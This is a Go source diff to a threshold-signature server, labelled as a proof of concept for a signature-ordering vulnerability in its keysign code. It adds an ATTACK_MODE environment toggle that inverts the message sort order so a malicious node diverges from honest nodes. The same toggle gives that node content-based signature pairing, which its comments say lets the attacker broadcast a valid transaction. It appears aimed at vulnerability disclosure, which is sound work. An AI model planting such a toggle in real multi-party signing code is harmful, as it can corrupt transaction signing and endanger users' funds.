@@ -4,6 +4,8 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"math/big"
+	"os"
 	"sort"
 	"strings"
 	"sync"
@@ -276,6 +278,11 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 		msgsToSign = append(msgsToSign, msgToSign)
 	}
 
+	// PoC: ATTACK_MODE toggle for demonstrating signature ordering vulnerability
+	// ATTACK_MODE=true: Sort in DESCENDING order (inverted) to mismatch with honest nodes
+	// ATTACK_MODE=false/unset: Sort in ASCENDING order (fixed behavior)
+	attackMode := os.Getenv("ATTACK_MODE") == "true"
+
 	sort.SliceStable(msgsToSign, func(i, j int) bool {
 		ma, err := common.MsgToHashInt(msgsToSign[i], algo)
 		if err != nil {
@@ -285,7 +292,13 @@ func (t *TssServer) KeySign(req keysign.Request) (keysign.Response, error) {
 		if err != nil {
 			t.logger.Error().Err(err).Msgf("fail to convert the hash value")
 		}
-		return ma.Cmp(mb) == -1
+		if attackMode {
+			// ATTACK: Descending order (inverted)
+			return ma.Cmp(mb) == 1 // NOTE: == 1 instead of == -1
+		} else {
+			// FIXED: Ascending order (normal)
+			return ma.Cmp(mb) == -1
+		}
 	})
 
 	oldJoinParty, err := conversion.VersionLTCheck(req.Version, messages.NEWJOINPARTYVERSION)
@@ -368,25 +381,88 @@ func (t *TssServer) broadcastKeysignFailure(messageID string, peers []peer.ID) {
 }
 
 func (t *TssServer) batchSignatures(algo tcommon.SigningAlgo, sigs []*tsslibcommon.SignatureData, msgsToSign [][]byte) keysign.Response {
-	var signatures []keysign.Signature
-	for i, sig := range sigs {
-		sigg := sig.GetSignature()
-		var signature keysign.Signature
-		switch algo {
-		case tcommon.SigningAlgoSecp256k1:
-			msg := base64.StdEncoding.EncodeToString(msgsToSign[i])
-			r := base64.StdEncoding.EncodeToString(sigg.R)
-			s := base64.StdEncoding.EncodeToString(sigg.S)
-			recovery := base64.StdEncoding.EncodeToString(sigg.GetSignatureRecovery())
+	// PoC: ATTACK_MODE enables content-based pairing so attacker can broadcast valid tx
+	// Non-attack mode uses index-based pairing (buggy behavior) for demonstration
+	attackMode := os.Getenv("ATTACK_MODE") == "true"
 
-			signature = keysign.NewSignature(msg, r, s, recovery)
-		case tcommon.SigningAlgoEd25519:
-			msg := base64.StdEncoding.EncodeToString(msgsToSign[i])
-			s := base64.StdEncoding.EncodeToString(sigg.Signature)
-			signature = keysign.NewSignature(msg, "", s, "")
+	var signatures []keysign.Signature
+
+	if attackMode {
+		// ATTACK MODE: Content-based signature pairing (THE FIX)
+		// This allows the attacker node to correctly match signatures to messages
+		// regardless of ordering, producing a valid transaction to broadcast
+
+		// Build message hash map for content-based matching
+		msgMap := make(map[string][]byte)
+		for _, msg := range msgsToSign {
+			var hashInt *big.Int
+			var err error
+			switch algo {
+			case tcommon.SigningAlgoSecp256k1:
+				hashInt, err = common.MsgToHashInt(msg, algo)
+			case tcommon.SigningAlgoEd25519:
+				hashInt, err = common.MsgToHashInt(msg, algo)
+			}
+			if err != nil {
+				t.logger.Error().Err(err).Msg("fail to convert msg to hash")
+				continue
+			}
+			hashKey := hashInt.String()
+			msgMap[hashKey] = msg
 		}
-		signatures = append(signatures, signature)
+
+		// Pair signatures by matching signature's M field to message hash
+		for _, sig := range sigs {
+			sigg := sig.GetSignature()
+
+			// Find original message by signature's M field
+			sigHashInt := new(big.Int).SetBytes(sigg.M)
+			sigHashKey := sigHashInt.String()
+			originalMsg, found := msgMap[sigHashKey]
+
+			if !found {
+				t.logger.Error().Msgf("signature hash %s not found in message map", sigHashKey)
+				continue
+			}
+
+			var signature keysign.Signature
+			switch algo {
+			case tcommon.SigningAlgoSecp256k1:
+				msg := base64.StdEncoding.EncodeToString(originalMsg)
+				r := base64.StdEncoding.EncodeToString(sigg.R)
+				s := base64.StdEncoding.EncodeToString(sigg.S)
+				recovery := base64.StdEncoding.EncodeToString(sigg.GetSignatureRecovery())
+				signature = keysign.NewSignature(msg, r, s, recovery)
+			case tcommon.SigningAlgoEd25519:
+				msg := base64.StdEncoding.EncodeToString(originalMsg)
+				s := base64.StdEncoding.EncodeToString(sigg.Signature)
+				signature = keysign.NewSignature(msg, "", s, "")
+			}
+			signatures = append(signatures, signature)
+		}
+	} else {
+		// NORMAL MODE: Index-based signature pairing (BUGGY BEHAVIOR)
+		// This is the vulnerable code that assumes signatures are in same order as messages
+		for i, sig := range sigs {
+			sigg := sig.GetSignature()
+			var signature keysign.Signature
+			switch algo {
+			case tcommon.SigningAlgoSecp256k1:
+				msg := base64.StdEncoding.EncodeToString(msgsToSign[i])
+				r := base64.StdEncoding.EncodeToString(sigg.R)
+				s := base64.StdEncoding.EncodeToString(sigg.S)
+				recovery := base64.StdEncoding.EncodeToString(sigg.GetSignatureRecovery())
+
+				signature = keysign.NewSignature(msg, r, s, recovery)
+			case tcommon.SigningAlgoEd25519:
+				msg := base64.StdEncoding.EncodeToString(msgsToSign[i])
+				s := base64.StdEncoding.EncodeToString(sigg.Signature)
+				signature = keysign.NewSignature(msg, "", s, "")
+			}
+			signatures = append(signatures, signature)
+		}
 	}
+
 	return keysign.NewResponse(
 		signatures,
 		common.Success,
